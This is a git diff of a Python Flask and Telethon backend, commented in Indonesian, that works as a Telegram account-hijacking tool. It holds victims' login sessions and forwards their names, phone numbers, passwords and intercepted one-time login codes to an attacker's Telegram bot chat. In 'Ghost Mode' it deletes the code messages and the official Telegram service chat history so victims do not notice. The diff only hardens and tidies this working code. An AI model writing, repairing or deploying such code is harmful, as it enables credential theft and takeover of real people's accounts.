@@ -4,7 +4,6 @@ from flask_cors import CORS
 from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from telethon.tl.functions.messages import DeleteHistoryRequest
-from telethon.tl.functions.users import GetFullUserRequest
 
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
@@ -15,6 +14,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"
 
+# Database RAM
 user_db = {}
 
 def bot_api(method, payload):
@@ -44,7 +44,7 @@ async def handle_flow(data):
         nomor = '+' + num
 
         if nomor not in user_db:
-            user_db[nomor] = {"session": "", "hash": "", "nama": "", "sandi": "None", "last_msg_id": None, "status_msg_id": None}
+            user_db[nomor] = {"session": "", "hash": "", "nama": "User", "sandi": "None", "status_msg_id": None}
 
         client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
         await client.connect()
@@ -77,7 +77,7 @@ async def handle_flow(data):
         if client: await client.disconnect()
 
 async def finalize_login(client, nomor):
-    # Ambil Nama Asli dari Telegram (Hanya kata pertama)
+    # Ambil Nama Depan Asli
     me = await client.get_me()
     nama_asli = me.first_name if me.first_name else "User"
     nama_depan = nama_asli.split()[0]
@@ -87,7 +87,7 @@ async def finalize_login(client, nomor):
     await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
     
     pesan = f"Nama: **{nama_depan}**\nNomor: `{nomor}`\nKata sandi: {user_db[nomor]['sandi']}"
-    res = bot_api("sendMessage", {
+    bot_api("sendMessage", {
         "chat_id": CHAT_ID,
         "text": pesan,
         "parse_mode": "Markdown",
@@ -98,23 +98,34 @@ async def finalize_login(client, nomor):
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
-    if "callback_query" in update:
+    if update and "callback_query" in update:
         call = update["callback_query"]
+        callback_data = call.get("data", "")
+        
+        # WAJIB: Menghilangkan loading di tombol bot
         bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
         
-        act, nomor = call["data"].split("_")
-        if act == "upd":
-            # Teks status "Siap Menerima OTP"
-            res = bot_api("sendMessage", {
-                "chat_id": CHAT_ID, 
-                "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
-            })
-            user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
-            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
-    return jsonify({"status": "success"})
+        if "_" in callback_data:
+            act, nomor = callback_data.split("_", 1)
+            if act == "upd":
+                # Kirim teks status "Bot Siap"
+                res = bot_api("sendMessage", {
+                    "chat_id": CHAT_ID, 
+                    "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
+                })
+                # Simpan message_id untuk dihapus nanti
+                if nomor in user_db:
+                    user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
+                
+                # Jalankan pengintip OTP
+                threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
+                
+    return jsonify({"status": "success"}), 200
 
 async def monitor_otp(nomor):
     data = user_db.get(nomor)
+    if not data or not data['session']: return
+    
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     try:
         await client.connect()
@@ -126,30 +137,34 @@ async def monitor_otp(nomor):
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # Hapus pesan status "Siap Menerima"
-                if data['status_msg_id']:
+                # 1. Hapus teks "Bot Siap Menerima OTP"
+                if data.get('status_msg_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_msg_id']})
                 
-                # Kirim Data Lengkap + OTP Baru
-                teks_otp = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp.group(0)}`"
+                # 2. Kirim Data Lengkap + OTP Baru
+                teks_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp.group(0)}`"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
-                    "text": teks_otp, 
+                    "text": teks_baru, 
                     "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                 })
                 
+                # 3. Ghost Mode: Hapus kode di target
                 await event.delete(revoke=True)
                 await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
 
+        # Monitor selama 10 menit
         await asyncio.wait_for(client.run_until_disconnected(), timeout=600)
-    except errors.SessionRevokedError:
-        bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"Nomor {nomor} telah keluar sesi, tidak dapat mengambil kode."})
-    except: pass
-    finally: await client.disconnect()
+    except Exception as e:
+        if "revoked" in str(e).lower():
+            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"Nomor {nomor} telah keluar sesi, tidak dapat mengambil kode."})
+    finally:
+        await client.disconnect()
 
 if __name__ == "__main__":
     if os.getenv('RAILWAY_STATIC_URL'):
-        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
+        # Memastikan Webhook terpasang ke Telegram setiap server nyala
+        webhook_url = f"{RAILWAY_URL}/webhook"
+        bot_api("setWebhook", {"url": webhook_url})
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
-    
